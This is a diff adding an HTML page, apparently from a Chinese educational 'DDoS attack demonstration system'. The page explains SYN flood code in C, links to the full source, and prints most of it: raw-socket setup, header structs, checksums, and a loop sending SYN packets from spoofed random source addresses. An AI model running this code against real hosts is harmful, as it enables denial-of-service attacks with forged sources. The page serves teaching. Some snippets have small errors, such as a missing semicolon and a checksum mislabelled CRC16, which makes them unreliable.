@@ -1,0 +1,300 @@
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:th="http://www.thymeleaf.org"
+      xmlns:sec="http://www.thymeleaf.org/thymeleaf-extras-springsecurity3">
+<head>
+    <meta charset="utf-8" />
+    <!-- 最新版本的 Bootstrap 核心 CSS 文件 -->
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css" integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous">
+    <script src="https://cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js" integrity="sha384-nvAa0+6Qg9clwYCGGPpDQLVpLNn0fRaROjHqs13t4Ggj3Ez50XnGQqc/r8MhnRDZ" crossorigin="anonymous"></script>
+    <!-- 最新的 Bootstrap 核心 JavaScript 文件 -->
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>
+
+    <style>
+        #carousel-example-generic {
+            height: 75%;
+        }
+
+        #carousel-example-generic .carousel-inner>.item>img {
+            display: block;
+            width: 100%;
+            height: 75%;
+        }
+        body{
+            background:  no-repeat center;
+            background-size: auto;
+            padding-top: 25px;
+        }
+
+    </style>
+
+</head>
+<body>
+<!-- 反色导航条组件  -->
+<nav class="navbar navbar-inverse">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/function/index">DDoS攻击演示系统</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+            <ul class="nav navbar-nav">
+                <li><a href="/function/principle">原理介绍</a></li>
+                <li ><a href="/function/demonstration" >攻击演示</a></li>
+                <li><a href="/function/code">代码分析</a></li>
+                <li><a href="/function/defense">防御方法介绍与展示</a></li>
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">学习网站 <span class="caret"></span></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="#">Action</a></li>
+                        <li><a href="#">Another action</a></li>
+                        <li><a href="#">Something else here</a></li>
+                        <li role="separator" class="divider"></li>
+                        <li><a href="#">Separated link</a></li>
+                        <li role="separator" class="divider"></li>
+                        <li><a href="#">One more separated link</a></li>
+                    </ul>
+                </li>
+            </ul>
+            <ul class="nav navbar-nav navbar-right">
+                <li class="dropdown">
+                    <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">关于我们<span class="caret"></span></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="https://www.csdn.net/" target="_blank">CSDN</a></li>
+                        <li><a href="https://www.hetianlab.com/" target="_blank">合天网安实验室</a></li>
+                        <li><a href="https://www.cnvd.org.cn/" target="_blank">国家信息安全漏洞共享平台</a></li>
+                    </ul>
+                </li>
+            </ul>
+
+            <form class="navbar-form navbar-right "   action="https://www.baidu.com/s" target="_blank">
+                <div class="form-group">
+                    <input   type="text" name="wd" class="form-control" placeholder="Search">
+                </div>
+                <button type="submit" class="btn btn-default" >Submit</button>
+            </form>
+            <ul class="nav navbar-nav navbar-right" style="padding-right: 20px">
+                <li class="dropdown">
+                    <a href="#" th:text="${session.login.username}" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false"><span  class="caret"></span>
+                    </a>
+                    <ul class="dropdown-menu">
+                        <li>Email:<a th:text="${session.login.email}"></a></li>
+                        <li>Name:<a th:text="${session.login.name}"></a></li>
+                        <li>Phone:<a th:text="${session.login.phone}"></a></li>
+                        <li>Birthday:<a th:text="${session.login.birthday}"></a></li>
+                    </ul>
+                </li>
+            </ul>
+        </div><!-- /.navbar-collapse -->
+    </div><!-- /.container-fluid -->
+</nav>
+<div class="page-header">
+    <h1>SYN Flood代码分析 <small>The code analysis</small></h1>
+</div>
+<div class="container-fluid" style="margin-left: 20px; margin-right: 20px ">
+    <h3>完整源码下载</h3>
+    <a href="https://github.com/jiangeZh/SYN_Flood.git" target="_blank">https://github.com/jiangeZh/SYN_Flood.git</a>
+    <h2>部分源码分析  </h2>
+    <p><strong>1.主函数</strong></p>
+    <p>&nbsp;</p>
+    <pre><code>	/* 为DNS地址，查询并转换成IP地址 */
+	/
+ 	*gethostbyname()返回对应于给定主机名的包含主机名字和地址信息的hostent结构指针。
+ 	*struct hostent
+ 	*{
+ 	*  char *h_name;
+ 	*  char **h_aliases;
+ 	*  short h_addrtype;
+ 	*  short h_length;
+ 	*  char **h_addr_list;
+ 	*  #define h_addr h_addr_list[0]
+ 	*};
+ 	*/
+	host = gethostbyname(argv[1]);
+	if(host == NULL)
+	{
+perror(&quot;gethostbyname()&quot;);
+exit(1);
+	}
+	addr.sin_addr = *((struct in_addr*)(host-&gt;h_addr));
+	strncpy( dst_ip, inet_ntoa(addr.sin_addr), 16 )
+  	/* 建立原始socket */
+ 	/* raw icmp socket(IPPROTO_ICMP):
+ 	 * 不用构建IP头部分，只发送ICMP头和数据。返回包括IP头和ICM头和数据。
+ 	* raw udp socket(IPPROTO_UDP):
+ 	* 不用构建IP头部分，只发送UDP头和数据。返回包括IP头和UDP头和数据。
+ 	* raw tcp socket(IPPROTO_TCP):
+ 	* 不用构建IP头部分，只发送TCP头和数据。返回包括IP头和TCP头和数据。
+ 	* raw raw socket(IPPROTO_RAW):
+ 	* 要构建IP头部和要发送的各种协议的头部和数据。返回包括IP头和相应的协议头和数据。
+ 	*/
+	sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
+	if (sockfd &lt; 0)
+	{
+perror(&quot;socket()&quot;);
+exit(1);
+	}
+	/* 当需要编写自己的IP数据包首部时，可以在原始套接字上设置套接字	选项IP_HDRINCL.
+ 	* 在不设置这个选项的情况下，IP协议自动填充IP数据包的首部.
+ 	*/
+	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (char *)&amp;on, sizeof (on)) &lt; 0)
+	{
+perror(&quot;setsockopt()&quot;);
+exit(1);
+	}
+
+	/* 将程序的权限修改为普通用户 */
+	setuid(getpid());
+</code></pre>
+    <p>&nbsp;</p>
+    <p><strong>2.首部结构定义</strong><br/><strong>定义ip首部struct ip：</strong></p>
+    <pre><code>struct ip{
+unsigned char       hl; /* header length */
+unsigned char       tos; /* type of service */
+unsigned short      total_len; /* total length */
+unsigned short      id; /* identification */
+unsigned short      frag_and_flags; /* fragment offset field */
+#define IP_RF 0x8000 /* reserved fragment flag */
+#define IP_DF 0x4000 /* dont fragment flag */
+#define IP_MF 0x2000 /* more fragments flag */
+#define IP_OFFMASK 0x1fff /* mask for fragmenting bits */
+unsigned char       ttl; /* time to live */
+unsigned char       proto; /* protocol */
+unsigned short      checksum; /* checksum */
+unsigned int        sourceIP;
+unsigned int        destIP;
+};
+</code></pre>
+    <p><strong>定义TCP首部struct tcphdr：</strong></p>
+    <pre><code>struct tcphdr{
+unsigned short      sport;
+unsigned short      dport;
+unsigned int        seq;
+unsigned int        ack;
+unsigned char       lenres;
+unsigned char       flag;
+unsigned short      win;
+unsigned short      sum;
+unsigned short      urp;
+};
+</code></pre>
+    <p><img src="http://m.qpic.cn/psc?/V508JN1n4KRpVn1DUo9a1vIPBF2YQPvy/45NBuzDIW489QBoVep5mceB1tBj*AZM2Qw*s3H2qqcNiatPPwL8fJctPY.*usm3o0ld2PIsNUceGOhn2PNZ75p.WMVtESGVLrGhsHHNr*Ws!/b&amp;bo=LgLCAQAAAAADF90!&amp;rf=viewer_4" referrerpolicy="no-referrer"></p>
+    <p><strong>定义TCP伪首部struct pseudohdr：</strong></p>
+    <pre><code>struct pseudohdr
+{
+unsigned int        saddr;
+unsigned int        daddr;
+char                zero;
+char                protocol;
+unsigned short      length;
+};
+</code></pre>
+    <p><strong>伪首部是一个虚拟的数据结构，其中的信息是从数据报所在IP分组头的分组头中提取的，既不向下传送也不向上递交，而仅仅是为计算校验和。这样的校验和，既校验了TCP&amp;UDP用户数据的源端口号和目的端口号以及TCP&amp;UDP用户数据报的数据部分，又检验了IP数据报的源IP地址和目的地址。伪报头保证TCP&amp;UDP数据单元到达正确的目的地址。</strong></p>
+    <p><strong>3.checksum函数</strong><br/><strong>计算IP校验和时，计算内容仅为IP首部；</strong><br/><strong>计算TCP校验和时，计算内容为：伪首部+TCP首部+TCP数据；</strong> <br/><strong>这里使用的校验和函数是网上广为流传的：</strong></p>
+    <pre><code>/* CRC16校验 */
+unsigned short inline
+checksum (unsigned short *buffer, unsigned short size)
+{
+
+unsigned long cksum = 0;
+
+while(size&gt;1){
+    cksum += *buffer++;
+    size  -= sizeof(unsigned short);
+}
+
+if(size){
+    cksum += *(unsigned char *)buffer;
+}
+
+cksum = (cksum &gt;&gt; 16) + (cksum &amp; 0xffff);
+cksum += (cksum &gt;&gt; 16);
+
+return((unsigned short )(~cksum));
+}
+</code></pre>
+    <p><strong>4.send_synflood函数</strong><br/><strong>初始化头部信息，并使用随机生成的源地址填充后计算校验和。</strong><br/><strong>最后把IP首部+TCP首部打包发送出去。</strong></p>
+    <pre><code>/* 初始化头部信息 */
+init_header(&amp;ip, &amp;tcp, &amp;pseudoheader);
+/* 处于活动状态时持续发送SYN包 */
+while(alive)
+{
+    ip.sourceIP = rand();
+
+    //计算IP校验和
+    bzero(buf, sizeof(buf));
+    memcpy(buf , &amp;ip, sizeof(struct ip));
+    ip.checksum = checksum((u_short *) buf, sizeof(struct ip));
+
+    pseudoheader.saddr = ip.sourceIP;
+
+    //计算TCP校验和
+    bzero(buf, sizeof(buf));
+    memcpy(buf , &amp;pseudoheader, sizeof(pseudoheader));
+    memcpy(buf+sizeof(pseudoheader), &amp;tcp, sizeof(struct tcphdr));
+    tcp.sum = checksum((u_short *) buf, sizeof(pseudoheader)+sizeof(struct tcphdr));
+
+    //打包IP+TCP
+    bzero(sendbuf, sizeof(sendbuf));
+    memcpy(sendbuf, &amp;ip, sizeof(struct ip));
+    memcpy(sendbuf+sizeof(struct ip), &amp;tcp, sizeof(struct tcphdr));
+    printf(&quot;.&quot;);
+    if (
+        sendto(sockfd, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr))
+        &lt; 0)
+    {
+        perror(&quot;sendto()&quot;);
+        pthread_exit(&quot;fail&quot;);
+    }
+}
+</code></pre>
+    <p><strong>5.init_header函数</strong>  </p>
+    <pre><code>	/* 首部初始化函数
+ 	* 填写IP头部，TCP头部
+ 	* TCP伪头部仅用于校验和的计算
+ 	*/
+	void
+	init_header(struct ip *ip, struct tcphdr *tcp, struct pseudohdr *pseudoheader)
+	{
+int len = sizeof(struct ip) + sizeof(struct tcphdr);
+// IP头部数据初始化
+ip-&gt;hl = (4&lt;&lt;4 | sizeof(struct ip)/sizeof(unsigned int));
+ip-&gt;tos = 0;
+ip-&gt;total_len = htons(len);
+ip-&gt;id = 1;
+ip-&gt;frag_and_flags = 0x40; //不分片标志
+ip-&gt;ttl = 255;
+ip-&gt;proto = IPPROTO_TCP;
+ip-&gt;checksum = 0;
+ip-&gt;sourceIP = 0;
+ip-&gt;destIP = inet_addr(dst_ip);
+
+// TCP头部数据初始化
+tcp-&gt;sport = htons( rand()%16383 + 49152 );
+tcp-&gt;dport = htons(dst_port);
+tcp-&gt;seq = htonl( rand()%90000000 + 2345 );
+tcp-&gt;ack = 0;
+tcp-&gt;lenres = (sizeof(struct tcphdr)/4&lt;&lt;4|0);
+tcp-&gt;flag = 0x02; //SYN标志
+tcp-&gt;win = htons (2048);
+tcp-&gt;sum = 0;
+tcp-&gt;urp = 0;
+
+//TCP伪头部
+pseudoheader-&gt;zero = 0;
+pseudoheader-&gt;protocol = IPPROTO_TCP;
+pseudoheader-&gt;length = htons(sizeof(struct tcphdr));
+pseudoheader-&gt;daddr = inet_addr(dst_ip);
+srand((unsigned) time(NULL));
+	}
+</code></pre>
+    <p><strong>注意ip的hl字段：首部长度指的是IP层头部占32 bit字的数目(也就是IP层头部包含多少个4字节 – 32位),包括任何选项。由于它是一个4比特字段,因此首部最长为60个字节。普通IP数据报(没有任何选择项)字段的值是5 &lt;==&gt; 5 * 32 / 8 = 5 * 4 = 20 Bytes</strong></p>
+</div>
+</body>
+</html>
